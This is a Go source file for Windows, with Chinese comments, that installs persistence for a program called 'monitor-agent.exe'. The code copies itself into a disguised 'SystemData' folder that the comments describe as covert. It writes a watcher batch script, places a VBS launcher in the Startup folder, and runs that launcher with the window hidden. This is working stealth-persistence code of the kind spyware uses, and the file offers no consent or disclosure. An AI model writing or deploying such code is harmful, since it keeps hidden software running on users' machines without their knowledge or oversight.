//go:build windows

package main

import (
	_ "embed" // Required for go:embed
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

// 内嵌 watcher.bat 和 keeper.vbs
//
//go:embed watcher.bat
var watcherScript []byte

//go:embed keeper.vbs
var keeperScript []byte

const (
	appName        = "monitor-agent.exe" // 您的程序名
	dataDirName    = "SystemData"        // 用于存放程序的隐蔽目录名
	keeperVbsName  = "keeper.vbs"
	watcherBatName = "watcher.bat"
)

// getPaths 构建所有需要的路径
func getPaths() (hiddenDir, targetExePath, targetWatcherPath, startupVbsPath string, err error) {
	userProfile, err := os.UserHomeDir()
	if err != nil {
		return "", "", "", "", fmt.Errorf("无法获取用户目录: %w", err)
	}

	hiddenDir = filepath.Join(userProfile, "AppData", "Local", dataDirName)
	targetExePath = filepath.Join(hiddenDir, appName)
	targetWatcherPath = filepath.Join(hiddenDir, watcherBatName)

	startupDir := filepath.Join(userProfile, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupVbsPath = filepath.Join(startupDir, keeperVbsName)

	return
}

// CheckPersistence 检查持久化是否已设置
// 返回: (是否已设置, 目标可执行文件路径)
func CheckPersistence() (bool, string) {
	_, targetExePath, _, startupVbsPath, err := getPaths()
	if err != nil {
		return false, ""
	}

	// 检查 VBS 启动脚本是否存在
	if _, err := os.Stat(startupVbsPath); os.IsNotExist(err) {
		return false, ""
	}

	return true, targetExePath
}

// SetupPersistence 执行所有持久化设置步骤
func SetupPersistence() error {
	log.Println("正在设置持久化...")

	// 1. 获取所有路径
	hiddenDir, targetExePath, targetWatcherPath, startupVbsPath, err := getPaths()
	if err != nil {
		return err
	}

	// 2. 创建隐蔽目录
	if err := os.MkdirAll(hiddenDir, 0755); err != nil {
		return fmt.Errorf("创建隐蔽目录 '%s' 失败: %w", hiddenDir, err)
	}
	log.Printf("隐蔽目录已确保存在: %s", hiddenDir)

	// 3. 将当前程序复制到目标位置
	currentExePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取当前执行路径失败: %w", err)
	}

	sourceFile, err := os.Open(currentExePath)
	if err != nil {
		return fmt.Errorf("打开源文件失败: %w", err)
	}
	defer sourceFile.Close()

	destFile, err := os.Create(targetExePath)
	if err != nil {
		return fmt.Errorf("创建目标文件失败: %w", err)
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return fmt.Errorf("复制可执行文件失败: %w", err)
	}
	log.Printf("程序已复制到: %s", targetExePath)

	// 4. 修改并写入 watcher.bat
	watcherContent := string(watcherScript)
	// 批处理文件中的路径需要双反斜杠
	escapedExePath := strings.ReplaceAll(targetExePath, `\`, `\\`)
	modifiedWatcher := strings.Replace(watcherContent, `_PROCESS_PATH_PLACEHOLDER_`, escapedExePath, 1)

	err = os.WriteFile(targetWatcherPath, []byte(modifiedWatcher), 0644)
	if err != nil {
		return fmt.Errorf("写入 watcher.bat 失败: %w", err)
	}
	log.Printf("守护脚本已创建: %s", targetWatcherPath)

	// 5. 修改并写入 keeper.vbs 到启动项
	keeperContent := string(keeperScript)
	// VBScript 中的 Run 方法参数需要用引号包裹
	escapedWatcherPath := fmt.Sprintf(`"%s"`, targetWatcherPath)
	modifiedKeeper := strings.Replace(keeperContent, `_WATCHER_PATH_PLACEHOLDER_`, escapedWatcherPath, 1)

	err = os.WriteFile(startupVbsPath, []byte(modifiedKeeper), 0644)
	if err != nil {
		return fmt.Errorf("写入 keeper.vbs 到启动项失败: %w", err)
	}
	log.Printf("启动脚本已放置: %s", startupVbsPath)

	// 6. 运行 VBS 脚本启动守护进程
	cmd := exec.Command("wscript.exe", startupVbsPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("启动 keeper.vbs 失败: %w", err)
	}
	log.Println("成功启动守护脚本。程序将由守护进程管理。")

	return nil
}
